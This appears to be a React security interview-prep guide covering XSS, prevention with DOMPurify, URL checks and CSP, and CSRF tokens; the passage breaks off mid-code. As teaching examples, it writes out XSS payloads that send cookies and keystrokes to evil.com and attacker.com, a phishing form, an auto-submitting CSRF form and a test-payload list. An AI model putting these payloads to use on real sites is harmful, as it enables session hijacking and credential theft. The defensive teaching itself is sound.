# Security

> Expert / Architect Level (5+ years)

---

## Questions

181. What is XSS (Cross-Site Scripting) in React context?
182. How do you prevent XSS attacks in React?
183. What is CSRF protection and how to implement it?
184. How do you securely handle authentication tokens?
185. What is Content Security Policy (CSP) and React?
186. How do you sanitize user input in React?
187. What are the security implications of dangerouslySetInnerHTML?
188. How do you implement secure file uploads?
189. What is dependency security scanning?
190. How do you protect against common React vulnerabilities?

---

## Detailed Answers

### 181. What is XSS (Cross-Site Scripting) in React context?

<details>
<summary>View Answer</summary>

**Cross-Site Scripting (XSS)** is a security vulnerability where attackers inject malicious scripts into web applications that are then executed in other users' browsers. In React, XSS can occur when user-supplied data is rendered without proper sanitization, despite React's built-in protections.

#### Understanding XSS

**What is XSS?**
```
Definition:
- Attacker injects malicious JavaScript code
- Code executes in victim's browser
- Can steal data, hijack sessions, deface sites
- One of the most common web vulnerabilities

Impact:
- Steal cookies/tokens
- Session hijacking
- Credential theft
- Malware distribution
- Defacement
```

**Types of XSS:**
```
1. Stored XSS (Persistent)
   - Malicious script stored in database
   - Executed when page loads
   - Most dangerous

2. Reflected XSS (Non-Persistent)
   - Script in URL parameters
   - Reflected back in response
   - Requires victim to click link

3. DOM-based XSS
   - Vulnerability in client-side code
   - Never sent to server
   - Manipulates DOM directly
```

---

#### React's Built-in XSS Protection

**Automatic Escaping:**
```jsx
function UserProfile({ username }) {
  // React automatically escapes this - SAFE
  return <div>Hello, {username}!</div>;
}

// Even if username is:
const malicious = '<img src=x onerror="alert(\'XSS\')">'

// React renders as text, not HTML:
// <div>Hello, &lt;img src=x onerror="alert('XSS')"&gt;!</div>
```

**How React Protects:**
```jsx
// React escapes by default
const name = '<script>alert("XSS")</script>';

// This is SAFE - rendered as text
return <h1>{name}</h1>;

// Output: <h1>&lt;script&gt;alert("XSS")&lt;/script&gt;</h1>
// The script tags are escaped, not executed
```

---

#### Vulnerable Patterns in React

**1. dangerouslySetInnerHTML (Most Common):**
```jsx
// VULNERABLE - Direct HTML injection
function BlogPost({ content }) {
  // If content contains malicious HTML, it executes!
  return (
    <div dangerouslySetInnerHTML={{ __html: content }} />
  );
}

// Attack:
const maliciousContent = `
  <img src=x onerror="
    fetch('https://evil.com/steal?cookie=' + document.cookie)
  ">
`;

// This executes the malicious code!
<BlogPost content={maliciousContent} />
```

**2. href with javascript: protocol:**
```jsx
// VULNERABLE
function Link({ url, children }) {
  return <a href={url}>{children}</a>;
}

// Attack:
<Link url="javascript:alert('XSS')">Click me</Link>

// When clicked, executes JavaScript!
```

**3. Dynamic src attributes:**
```jsx
// VULNERABLE
function Avatar({ imageUrl }) {
  return <img src={imageUrl} />;
}

// Attack:
<Avatar imageUrl="javascript:alert('XSS')" />
```

**4. Event handlers from user input:**
```jsx
// VULNERABLE
function CustomButton({ onClick }) {
  // If onClick is a string from user input
  return <button onClick={onClick}>Click</button>;
}

// Attack (if onClick comes from unsafe source):
<CustomButton onClick="alert('XSS')" />
```

**5. URL parameters in attributes:**
```jsx
// VULNERABLE
function ProductPage() {
  const params = new URLSearchParams(window.location.search);
  const productId = params.get('id');
  
  return (
    <div>
      <a href={`/products/${productId}`}>View Product</a>
    </div>
  );
}

// Attack URL:
// /products?id=javascript:alert('XSS')
```

**6. innerHTML manipulation:**
```jsx
// VULNERABLE
function RichTextEditor({ html }) {
  const divRef = useRef();
  
  useEffect(() => {
    // Direct innerHTML assignment - dangerous!
    divRef.current.innerHTML = html;
  }, [html]);
  
  return <div ref={divRef} />;
}
```

---

#### Real-World XSS Examples in React

**Example 1: Comment System (Stored XSS):**
```jsx
// VULNERABLE comment display
function Comment({ comment }) {
  return (
    <div>
      <strong>{comment.author}</strong>
      {/* Dangerous if comment.text contains HTML */}
      <div dangerouslySetInnerHTML={{ __html: comment.text }} />
    </div>
  );
}

// Attacker posts comment:
const attackComment = {
  author: 'Attacker',
  text: `
    <img src=x onerror="
      // Steal all user cookies
      fetch('https://evil.com/steal', {
        method: 'POST',
        body: document.cookie
      })
    ">
  `
};

// Every user who views this comment is compromised!
```

**Example 2: Search Results (Reflected XSS):**
```jsx
// VULNERABLE search display
function SearchResults() {
  const [searchParams] = useSearchParams();
  const query = searchParams.get('q');
  
  return (
    <div>
      <h2>Search results for: {query}</h2>
      {/* If query contains HTML/JS */}
    </div>
  );
}

// Attack URL:
// /search?q=<img src=x onerror="alert(document.cookie)">

// Note: This example is actually SAFE in React due to automatic escaping
// But becomes vulnerable if using dangerouslySetInnerHTML
```

**Example 3: Rich Text Editor (DOM-based XSS):**
```jsx
// VULNERABLE editor
function Editor({ initialContent }) {
  const [content, setContent] = useState(initialContent);
  
  const handlePaste = (e) => {
    const html = e.clipboardData.getData('text/html');
    // Dangerous! Pasted HTML could contain scripts
    setContent(html);
  };
  
  return (
    <div
      onPaste={handlePaste}
      dangerouslySetInnerHTML={{ __html: content }}
    />
  );
}
```

---

#### XSS Attack Vectors in React

**1. User-Generated Content:**
```jsx
// Forum posts, comments, reviews, bios
function UserBio({ bio }) {
  // VULNERABLE if bio contains HTML
  return <div dangerouslySetInnerHTML={{ __html: bio }} />;
}
```

**2. URL Parameters:**
```jsx
// Query strings, route parameters
function Redirect() {
  const params = new URLSearchParams(location.search);
  const returnUrl = params.get('return');
  
  // VULNERABLE to javascript: protocol
  return <a href={returnUrl}>Return</a>;
}
```

**3. Third-Party Data:**
```jsx
// External APIs, RSS feeds, social media embeds
function ExternalContent({ apiData }) {
  // VULNERABLE if API is compromised
  return <div dangerouslySetInnerHTML={{ __html: apiData.html }} />;
}
```

**4. Markdown/BBCode Conversion:**
```jsx
// Converting markup to HTML
function MarkdownPost({ markdown }) {
  const html = markdownToHtml(markdown); // Could be unsafe
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}
```

**5. SVG Content:**
```jsx
// SVG can contain JavaScript
function Icon({ svgContent }) {
  // VULNERABLE - SVG can have <script> tags
  return <div dangerouslySetInnerHTML={{ __html: svgContent }} />;
}

// Attack:
const maliciousSvg = `
  <svg>
    <script>alert('XSS')</script>
  </svg>
`;
```

---

#### Testing for XSS Vulnerabilities

**Common XSS Payloads:**
```javascript
// Basic alert
<script>alert('XSS')</script>

// Image onerror
<img src=x onerror="alert('XSS')">

// SVG
<svg onload="alert('XSS')">

// Body onload
<body onload="alert('XSS')">

// JavaScript protocol
javascript:alert('XSS')

// Data URL
data:text/html,<script>alert('XSS')</script>

// Event handlers
<div onclick="alert('XSS')">Click</div>

// Style attribute
<div style="background:url('javascript:alert(\'XSS\')')"></div>
```

**Testing Checklist:**
```javascript
const xssTestPayloads = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  'javascript:alert(1)',
  '<svg onload=alert(1)>',
  '"><script>alert(1)</script>',
  '<iframe src="javascript:alert(1)">',
  '<input onfocus=alert(1) autofocus>',
  '<select onfocus=alert(1) autofocus>',
  '<textarea onfocus=alert(1) autofocus>',
  '<body onload=alert(1)>',
  '<marquee onstart=alert(1)>',
];

// Test each input field with these payloads
```

---

#### Impact of XSS Attacks

**1. Session Hijacking:**
```javascript
// Steal session cookie
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: document.cookie
  });
</script>

// Attacker can now impersonate the user
```

**2. Credential Theft:**
```javascript
// Inject fake login form
<script>
  document.body.innerHTML = `
    <form action="https://attacker.com/phish" method="POST">
      <input name="username" placeholder="Username">
      <input name="password" type="password" placeholder="Password">
      <button>Login</button>
    </form>
  `;
</script>
```

**3. Keylogging:**
```javascript
// Log all keystrokes
<script>
  document.addEventListener('keypress', (e) => {
    fetch('https://attacker.com/log?key=' + e.key);
  });
</script>
```

**4. Defacement:**
```javascript
// Replace page content
<script>
  document.body.innerHTML = '<h1>Hacked!</h1>';
</script>
```

**5. Malware Distribution:**
```javascript
// Redirect to malicious site
<script>
  window.location = 'https://malware-site.com';
</script>
```

---

#### XSS in Modern React Applications

**Server-Side Rendering (SSR) Concerns:**
```jsx
// Next.js example - VULNERABLE
export async function getServerSideProps({ query }) {
  return {
    props: {
      userInput: query.input, // Not sanitized
    },
  };
}

function Page({ userInput }) {
  // If used with dangerouslySetInnerHTML, it's vulnerable
  return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
}
```

**API Responses:**
```jsx
// VULNERABLE if API returns unsanitized HTML
function DataDisplay() {
  const [data, setData] = useState(null);
  
  useEffect(() => {
    fetch('/api/data')
      .then(r => r.json())
      .then(data => setData(data));
  }, []);
  
  if (!data) return null;
  
  // VULNERABLE - API data could contain XSS
  return <div dangerouslySetInnerHTML={{ __html: data.content }} />;
}
```

---

#### Security Misconceptions

**❌ Common Mistakes:**

1. **"React is immune to XSS"**
   ```jsx
   // FALSE - React has protections but they can be bypassed
   <div dangerouslySetInnerHTML={{ __html: userInput }} /> // VULNERABLE
   ```

2. **"Only user input from forms is dangerous"**
   ```jsx
   // FALSE - URL params, cookies, localStorage also dangerous
   const data = localStorage.getItem('cached');
   <div dangerouslySetInnerHTML={{ __html: data }} /> // VULNERABLE
   ```

3. **"Client-side validation is enough"**
   ```jsx
   // FALSE - Attackers bypass client-side validation
   // Always validate on server
   ```

4. **"Encoding once is sufficient"**
   ```jsx
   // FALSE - Context matters (HTML, JS, URL, CSS)
   // Need different encoding for each context
   ```

---

#### Interview Tips

✅ **Key Points:**
- XSS = malicious script injection executed in victim's browser
- Three types: Stored, Reflected, DOM-based
- React auto-escapes JSX expressions (built-in protection)
- Vulnerable patterns: dangerouslySetInnerHTML, javascript: URLs, innerHTML
- Impact: session hijacking, data theft, defacement

✅ **When to Mention:**
- Security discussions
- User-generated content handling
- Rich text editors
- Third-party integrations
- Authentication/authorization

✅ **Common Follow-ups:**
- "How does React protect against XSS?"
- "When is dangerouslySetInnerHTML necessary?"
- "How do you sanitize HTML in React?"
- "What's the difference between XSS and CSRF?"
- "How do you test for XSS vulnerabilities?"

✅ **Perfect Answer Structure:**
1. Definition: Script injection vulnerability
2. Types: Stored (persistent), Reflected (URL), DOM-based
3. React Protection: Auto-escapes JSX expressions
4. Vulnerable Patterns: dangerouslySetInnerHTML, javascript: URLs
5. Impact: Cookie theft, session hijacking, defacement
6. Prevention: Sanitize input, avoid dangerouslySetInnerHTML, validate URLs
7. Example: Show vulnerable code and fix

</details>

---

### 182. How do you prevent XSS attacks in React?

<details>
<summary>View Answer</summary>

**Preventing XSS attacks in React** requires multiple layers of defense: leveraging React's built-in protections, sanitizing user input, validating URLs, using Content Security Policy, and following security best practices.

#### 1. Leverage React's Built-in Protection

**Default Escaping (Automatic):**
```jsx
// SAFE - React automatically escapes
function UserGreeting({ name }) {
  return <h1>Hello, {name}!</h1>;
}

// Even if name contains HTML/JavaScript
const malicious = '<script>alert("XSS")</script>';
<UserGreeting name={malicious} />

// Renders safely as text:
// <h1>Hello, &lt;script&gt;alert("XSS")&lt;/script&gt;!</h1>
```

**How React Escapes:**
```jsx
// React converts these characters:
const escaped = {
  '<': '&lt;',
  '>': '&gt;',
  '"': '&quot;',
  "'": '&#x27;',
  '&': '&amp;',
};

// Example:
const input = '<img src=x onerror="alert(1)">';
return <div>{input}</div>;
// Output: <div>&lt;img src=x onerror="alert(1)"&gt;</div>
```

---

#### 2. Avoid dangerouslySetInnerHTML

**Bad Practice:**
```jsx
// VULNERABLE - Don't do this!
function BlogPost({ content }) {
  return (
    <div dangerouslySetInnerHTML={{ __html: content }} />
  );
}
```

**Better: Use React Components:**
```jsx
// SAFE - Render as React components
function BlogPost({ content }) {
  // Parse content into React elements
  return (
    <div>
      {content.split('\n').map((line, i) => (
        <p key={i}>{line}</p>
      ))}
    </div>
  );
}
```

**If HTML is Necessary: Sanitize First:**
```bash
npm install dompurify
```

```jsx
import DOMPurify from 'dompurify';

function SafeBlogPost({ htmlContent }) {
  // Sanitize HTML before rendering
  const sanitizedHtml = DOMPurify.sanitize(htmlContent, {
    ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href'],
  });
  
  return (
    <div dangerouslySetInnerHTML={{ __html: sanitizedHtml }} />
  );
}
```

---

#### 3. Sanitize User Input

**DOMPurify Library:**
```jsx
import DOMPurify from 'dompurify';

function UserComment({ comment }) {
  // Configure sanitizer
  const cleanHtml = DOMPurify.sanitize(comment.html, {
    // Allowed tags
    ALLOWED_TAGS: [
      'p', 'br', 'strong', 'em', 'u',
      'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
      'ul', 'ol', 'li', 'a', 'blockquote',
    ],
    
    // Allowed attributes
    ALLOWED_ATTR: ['href', 'title', 'target'],
    
    // Allow specific URL schemes
    ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,
  });
  
  return (
    <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />
  );
}
```

**Custom Sanitization:**
```javascript
function sanitizeInput(input) {
  // Remove all HTML tags
  return input.replace(/<[^>]*>/g, '');
}

// Or use built-in DOM API
function stripHtml(html) {
  const temp = document.createElement('div');
  temp.textContent = html;
  return temp.innerHTML;
}

// Usage
function SafeDisplay({ userInput }) {
  const clean = sanitizeInput(userInput);
  return <div>{clean}</div>;
}
```

---

#### 4. Validate and Sanitize URLs

**URL Validation:**
```jsx
function isValidUrl(url) {
  // Only allow http(s) protocols
  try {
    const parsed = new URL(url);
    return ['http:', 'https:'].includes(parsed.protocol);
  } catch {
    return false;
  }
}

function SafeLink({ href, children }) {
  // Validate URL before rendering
  const safeHref = isValidUrl(href) ? href : '#';
  
  return (
    <a
      href={safeHref}
      target="_blank"
      rel="noopener noreferrer"
    >
      {children}
    </a>
  );
}

// SAFE usage
<SafeLink href={userProvidedUrl}>Click</SafeLink>
```

**Advanced URL Sanitization:**
```javascript
function sanitizeUrl(url) {
  // Blocklist dangerous protocols
  const dangerous = [
    'javascript:',
    'data:',
    'vbscript:',
    'file:',
  ];
  
  const lowerUrl = url.toLowerCase().trim();
  
  // Check for dangerous protocols
  if (dangerous.some(proto => lowerUrl.startsWith(proto))) {
    return 'about:blank';
  }
  
  // Allow only safe protocols
  try {
    const parsed = new URL(url);
    if (!['http:', 'https:', 'mailto:'].includes(parsed.protocol)) {
      return 'about:blank';
    }
    return url;
  } catch {
    // Invalid URL
    return 'about:blank';
  }
}

function SafeRedirect({ url }) {
  const safeUrl = sanitizeUrl(url);
  return <a href={safeUrl}>Continue</a>;
}
```

---

#### 5. Use Content Security Policy (CSP)

**CSP Headers:**
```html
<!-- In HTML -->
<meta
  http-equiv="Content-Security-Policy"
  content="
    default-src 'self';
    script-src 'self' 'unsafe-inline' https://trusted-cdn.com;
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    font-src 'self' https://fonts.gstatic.com;
    connect-src 'self' https://api.example.com;
  "
/>
```

**Next.js Configuration:**
```javascript
// next.config.js
module.exports = {
  async headers() {
    return [
      {
        source: '/(.*)',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: [
              "default-src 'self'",
              "script-src 'self' 'unsafe-eval' 'unsafe-inline'",
              "style-src 'self' 'unsafe-inline'",
              "img-src 'self' data: https:",
              "font-src 'self' data:",
              "connect-src 'self' https://api.example.com",
            ].join('; '),
          },
        ],
      },
    ];
  },
};
```

**Express.js:**
```javascript
const helmet = require('helmet');

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'", 'trusted-cdn.com'],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'", 'https://api.example.com'],
    },
  })
);
```

---

#### 6. Safe Markdown Rendering

**Using react-markdown (Safe by Default):**
```bash
npm install react-markdown
```

```jsx
import ReactMarkdown from 'react-markdown';

function MarkdownPost({ markdown }) {
  // react-markdown is XSS-safe by default
  return (
    <ReactMarkdown
      // Disable HTML in markdown
      disallowedElements={['script']}
      unwrapDisallowed
    >
      {markdown}
    </ReactMarkdown>
  );
}
```

**Custom Markdown with Sanitization:**
```jsx
import { marked } from 'marked';
import DOMPurify from 'dompurify';

function SafeMarkdown({ content }) {
  const html = marked(content);
  const cleanHtml = DOMPurify.sanitize(html);
  
  return (
    <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />
  );
}
```

---

#### 7. Input Validation

**Form Validation:**
```jsx
function SignupForm() {
  const [email, setEmail] = useState('');
  const [error, setError] = useState('');
  
  const validateEmail = (value) => {
    // Validate format
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(value)) {
      setError('Invalid email format');
      return false;
    }
    
    // Check length
    if (value.length > 254) {
      setError('Email too long');
      return false;
    }
    
    setError('');
    return true;
  };
  
  const handleSubmit = (e) => {
    e.preventDefault();
    if (validateEmail(email)) {
      // Safe to submit
      submitToServer(email);
    }
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <input
        type="email"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
        maxLength={254}
      />
      {error && <span className="error">{error}</span>}
      <button type="submit">Sign Up</button>
    </form>
  );
}
```

**Server-Side Validation (Critical):**
```javascript
// API route (Next.js)
export default async function handler(req, res) {
  const { userInput } = req.body;
  
  // Validate on server
  if (!isValidInput(userInput)) {
    return res.status(400).json({ error: 'Invalid input' });
  }
  
  // Sanitize
  const sanitized = sanitizeInput(userInput);
  
  // Save to database
  await db.save(sanitized);
  
  res.json({ success: true });
}

function isValidInput(input) {
  // Length check
  if (input.length > 1000) return false;
  
  // Pattern check
  if (/<script/i.test(input)) return false;
  
  return true;
}
```

---

#### 8. Secure Event Handlers

**Safe Event Handler:**
```jsx
function SafeButton({ onClick, children }) {
  // Ensure onClick is a function, not a string
  const handleClick = (e) => {
    if (typeof onClick === 'function') {
      onClick(e);
    }
  };
  
  return <button onClick={handleClick}>{children}</button>;
}

// SAFE
<SafeButton onClick={() => console.log('Clicked')}>Click</SafeButton>

// WON'T EXECUTE if onClick is malicious string
<SafeButton onClick="alert('XSS')">Click</SafeButton>
```

---

#### 9. Safe Rich Text Editors

**Using Draft.js (React Native):**
```jsx
import { Editor, EditorState } from 'draft-js';
import { stateToHTML } from 'draft-js-export-html';
import DOMPurify from 'dompurify';

function RichTextEditor() {
  const [editorState, setEditorState] = useState(
    EditorState.createEmpty()
  );
  
  const saveContent = () => {
    // Convert to HTML
    const html = stateToHTML(editorState.getCurrentContent());
    
    // Sanitize before saving
    const clean = DOMPurify.sanitize(html);
    
    // Save to server
    saveToServer(clean);
  };
  
  return (
    <>
      <Editor
        editorState={editorState}
        onChange={setEditorState}
      />
      <button onClick={saveContent}>Save</button>
    </>
  );
}
```

**Using Quill (Configured Safely):**
```jsx
import ReactQuill from 'react-quill';
import DOMPurify from 'dompurify';

function QuillEditor() {
  const [content, setContent] = useState('');
  
  // Configure allowed formats
  const modules = {
    toolbar: [
      ['bold', 'italic', 'underline'],
      ['link'],
      [{ 'list': 'ordered'}, { 'list': 'bullet' }],
    ],
  };
  
  const formats = [
    'bold', 'italic', 'underline',
    'link', 'list', 'bullet',
  ];
  
  const handleChange = (value) => {
    // Sanitize on change
    const clean = DOMPurify.sanitize(value);
    setContent(clean);
  };
  
  return (
    <ReactQuill
      value={content}
      onChange={handleChange}
      modules={modules}
      formats={formats}
    />
  );
}
```

---

#### 10. Secure Image Handling

**Image URL Validation:**
```jsx
function SafeImage({ src, alt }) {
  const [validSrc, setValidSrc] = useState('');
  
  useEffect(() => {
    // Validate image URL
    try {
      const url = new URL(src);
      if (['http:', 'https:'].includes(url.protocol)) {
        setValidSrc(src);
      } else {
        setValidSrc('/placeholder.png');
      }
    } catch {
      setValidSrc('/placeholder.png');
    }
  }, [src]);
  
  return (
    <img
      src={validSrc}
      alt={alt}
      onError={(e) => {
        e.target.src = '/placeholder.png';
      }}
    />
  );
}
```

**SVG Sanitization:**
```jsx
import DOMPurify from 'dompurify';

function SafeSvg({ svgContent }) {
  // SVG can contain scripts - must sanitize!
  const cleanSvg = DOMPurify.sanitize(svgContent, {
    USE_PROFILES: { svg: true, svgFilters: true },
  });
  
  return (
    <div dangerouslySetInnerHTML={{ __html: cleanSvg }} />
  );
}
```

---

#### 11. Secure Third-Party Content

**iframe Sandboxing:**
```jsx
function SafeEmbed({ url }) {
  return (
    <iframe
      src={url}
      sandbox="allow-scripts allow-same-origin"
      title="Embedded content"
      // Additional security
      referrerPolicy="no-referrer"
      loading="lazy"
    />
  );
}
```

**YouTube Embed (Safe):**
```jsx
function YouTubeEmbed({ videoId }) {
  // Validate videoId format
  const validId = /^[a-zA-Z0-9_-]{11}$/.test(videoId) ? videoId : null;
  
  if (!validId) return null;
  
  return (
    <iframe
      src={`https://www.youtube.com/embed/${validId}`}
      frameBorder="0"
      allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
      allowFullScreen
      title="YouTube video"
    />
  );
}
```

---

#### 12. Complete Security Example

**Secure Comment System:**
```jsx
import DOMPurify from 'dompurify';
import { useState } from 'react';

function CommentSection({ postId }) {
  const [comments, setComments] = useState([]);
  const [newComment, setNewComment] = useState('');
  
  // Load comments
  useEffect(() => {
    loadComments(postId).then(setComments);
  }, [postId]);
  
  // Submit comment
  const handleSubmit = async (e) => {
    e.preventDefault();
    
    // Client-side validation
    if (newComment.length > 1000) {
      alert('Comment too long');
      return;
    }
    
    // Strip HTML tags
    const textOnly = newComment.replace(/<[^>]*>/g, '');
    
    // Submit to server
    const response = await fetch('/api/comments', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        postId,
        text: textOnly, // Send text only
      }),
    });
    
    if (response.ok) {
      const saved = await response.json();
      setComments([...comments, saved]);
      setNewComment('');
    }
  };
  
  return (
    <div>
      {/* Display comments */}
      {comments.map(comment => (
        <Comment key={comment.id} comment={comment} />
      ))}
      
      {/* New comment form */}
      <form onSubmit={handleSubmit}>
        <textarea
          value={newComment}
          onChange={(e) => setNewComment(e.target.value)}
          maxLength={1000}
          placeholder="Add a comment..."
        />
        <button type="submit">Post Comment</button>
      </form>
    </div>
  );
}

function Comment({ comment }) {
  // Display as plain text (React auto-escapes)
  return (
    <div className="comment">
      <strong>{comment.author}</strong>
      <p>{comment.text}</p>
    </div>
  );
}
```

**Server-Side (API Route):**
```javascript
// api/comments.js
import DOMPurify from 'isomorphic-dompurify';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).end();
  }
  
  const { postId, text } = req.body;
  
  // Server-side validation
  if (!text || typeof text !== 'string') {
    return res.status(400).json({ error: 'Invalid input' });
  }
  
  if (text.length > 1000) {
    return res.status(400).json({ error: 'Comment too long' });
  }
  
  // Sanitize (defense in depth)
  const sanitized = DOMPurify.sanitize(text, {
    ALLOWED_TAGS: [], // No HTML allowed
  });
  
  // Save to database
  const comment = await db.comments.create({
    postId,
    text: sanitized,
    author: req.user.name,
    createdAt: new Date(),
  });
  
  res.json(comment);
}
```

---

#### 13. Security Checklist

**✅ Input Handling:**
- [ ] Never use `dangerouslySetInnerHTML` without sanitization
- [ ] Validate all user input (client and server)
- [ ] Sanitize HTML with DOMPurify
- [ ] Use React's automatic escaping
- [ ] Limit input length

**✅ URL Safety:**
- [ ] Validate URL protocols (block `javascript:`, `data:`)
- [ ] Use `rel="noopener noreferrer"` on external links
- [ ] Sanitize redirect URLs
- [ ] Validate image sources

**✅ Headers:**
- [ ] Implement Content Security Policy
- [ ] Set `X-Content-Type-Options: nosniff`
- [ ] Set `X-Frame-Options: DENY`
- [ ] Use HTTPS everywhere

**✅ Third-Party Content:**
- [ ] Sandbox iframes
- [ ] Validate embed URLs
- [ ] Sanitize SVG content
- [ ] Review third-party libraries

**✅ Development:**
- [ ] Regular security audits
- [ ] Keep dependencies updated
- [ ] Use security linters (ESLint plugins)
- [ ] Test with XSS payloads

---

#### Tools and Libraries

**Essential Libraries:**
```bash
# Sanitization
npm install dompurify
npm install isomorphic-dompurify  # For SSR

# Markdown (XSS-safe)
npm install react-markdown

# Security headers
npm install helmet  # Express
```

**Security Linters:**
```bash
# ESLint security plugins
npm install --save-dev eslint-plugin-security
npm install --save-dev eslint-plugin-react-security
```

```json
// .eslintrc.json
{
  "plugins": ["security", "react-security"],
  "extends": [
    "plugin:security/recommended",
    "plugin:react-security/recommended"
  ]
}
```

---

#### Interview Tips

✅ **Key Points:**
- React auto-escapes JSX expressions (primary defense)
- Never use dangerouslySetInnerHTML without sanitization
- Use DOMPurify to sanitize HTML
- Validate URLs (block javascript:, data: protocols)
- Implement Content Security Policy
- Validate input on both client and server

✅ **When to Mention:**
- Security discussions
- User-generated content
- Rich text editors
- External integrations
- Form handling

✅ **Common Follow-ups:**
- "What does dangerouslySetInnerHTML do?"
- "How does DOMPurify work?"
- "What is Content Security Policy?"
- "How do you handle markdown safely?"
- "What about SVG sanitization?"

✅ **Perfect Answer Structure:**
1. React's Defense: Auto-escaping JSX expressions
2. Avoid: dangerouslySetInnerHTML (or sanitize first)
3. Sanitize: Use DOMPurify for HTML content
4. Validate URLs: Block dangerous protocols
5. CSP: Implement Content Security Policy headers
6. Server Validation: Always validate on backend
7. Example: Show before/after with DOMPurify

</details>

---

### 183. What is CSRF protection and how to implement it?

<details>
<summary>View Answer</summary>

**Cross-Site Request Forgery (CSRF)** is an attack where a malicious site tricks a user's browser into making unwanted requests to a different site where the user is authenticated. CSRF protection requires implementing anti-CSRF tokens, SameSite cookies, and proper request validation.

#### Understanding CSRF

**What is CSRF?**
```
Definition:
- Attacker tricks authenticated user
- Into submitting unwanted requests
- Using user's existing session/cookies
- Without user's knowledge

Example Attack:
1. User logs into bank.com
2. Browser stores session cookie
3. User visits evil.com (while still logged in)
4. evil.com triggers request to bank.com/transfer
5. Browser automatically sends session cookie
6. Bank processes the request (thinks it's legitimate)
```

**How CSRF Works:**
```html
<!-- evil.com contains: -->
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker_account">
  <input name="amount" value="10000">
</form>
<script>
  // Auto-submit when page loads
  document.forms[0].submit();
</script>

<!-- Browser automatically sends session cookie to bank.com! -->
```

**CSRF vs XSS:**
```
CSRF:
- Tricks user's browser to make requests
- Uses existing authentication
- Doesn't steal data directly
- Targets state-changing operations

XSS:
- Injects malicious scripts
- Executes in user's browser
- Can steal data directly
- Can read page content
```

---

#### 1. CSRF Tokens (Primary Defense)

**How CSRF Tokens Work:**
```
1. Server generates unique token per session
2. Token embedded in forms/pages
3. Client includes token in requests
4. Server validates token matches session
5. Reject requests with invalid/missing tokens

Why it works:
- Attacker can't access token (same-origin policy)
- Token must be included in request
- Without valid token, request fails
```

**Server-Side Token Generation (Express):**
```javascript
const express = require('express');
const csrf = require('csurf');
const cookieParser = require('cookie-parser');

const app = express();

// Setup CSRF protection
const csrfProtection = csrf({ cookie: true });

app.use(cookieParser());
app.use(express.json());
app.use(express.urlencoded({ extended: false }));

// Generate CSRF token
app.get('/api/csrf-token', csrfProtection, (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

// Protected endpoint
app.post('/api/transfer', csrfProtection, (req, res) => {
  // CSRF token is automatically validated
  const { to, amount } = req.body;
  
  // Process transfer
  processTransfer(to, amount);
  
  res.json({ success: true });
});

app.listen(3000);
```

**React Client Implementation:**
```jsx
import { useState, useEffect } from 'react';

function TransferForm() {
  const [csrfToken, setCsrfToken] = useState('');
  const [formData, setFormData] = useState({
    to: '',
    amount: '',
  });
  
  // Fetch CSRF token on mount
  useEffect(() => {
    fetch('/api/csrf-token', {
      credentials: 'include', // Include cookies
    })
      .then(r => r.json())
      .then(data => setCsrfToken(data.csrfToken));
  }, []);
  
  const handleSubmit = async (e) => {
    e.preventDefault();
    
    // Include CSRF token in request
    const response = await fetch('/api/transfer', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'CSRF-Token': csrfToken, // Send token in header
      },
      credentials: 'include',
      body: JSON.stringify(formData),
    });
    
    if (response.ok) {
      alert('Transfer successful!');
    }
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <input
        name="to"
        value={formData.to}
        onChange={(e) => setFormData({ ...formData, to: e.target.value })}
        placeholder="Recipient"
      />
      <input
        name="amount"
        value={formData.amount}
        onChange={(e) => setFormData({ ...formData, amount: e.target.value })}
        placeholder="Amount"
      />
      <button type="submit">Transfer</button>
    </form>
  );
}
```

**Alternative: Token in Form Field:**
```jsx
function FormWithToken() {
  const [csrfToken, setCsrfToken] = useState('');
  
  useEffect(() => {
    // Fetch token
    fetch('/api/csrf-token', { credentials: 'include' })
      .then(r => r.json())
      .then(data => setCsrfToken(data.csrfToken));
  }, []);
  
  return (
    <form action="/api/submit" method="POST">
      {/* Hidden input with CSRF token */}
      <input type="hidden" name="_csrf" value={csrfToken} />
      
      <input name="data" />
      <button type="submit">Submit</button>
    </form>
  );
}
```

---

#### 2. SameSite Cookie Attribute

**SameSite Cookie Configuration:**
```javascript
// Express.js
const session = require('express-session');

app.use(
  session({
    secret: 'your-secret-key',
    cookie: {
      httpOnly: true,
      secure: true, // HTTPS only
      sameSite: 'strict', // or 'lax' or 'none'
      maxAge: 3600000, // 1 hour
    },
  })
);
```

**SameSite Values:**
```javascript
// Strict: Most secure
// Cookie only sent for same-site requests
sameSite: 'strict'
// Example: user@bank.com -> bank.com (cookie sent)
//          evil.com -> bank.com (cookie NOT sent)

// Lax: Balanced (default in modern browsers)
// Cookie sent for top-level navigation (GET)
sameSite: 'lax'
// Example: Link from evil.com to bank.com (cookie sent)
//          POST from evil.com to bank.com (cookie NOT sent)

// None: Least secure (requires Secure flag)
// Cookie sent for all requests (cross-site)
sameSite: 'none',
secure: true // Required with SameSite=None
```

**Next.js API Route:**
```javascript
// pages/api/login.js
import { serialize } from 'cookie';

export default async function handler(req, res) {
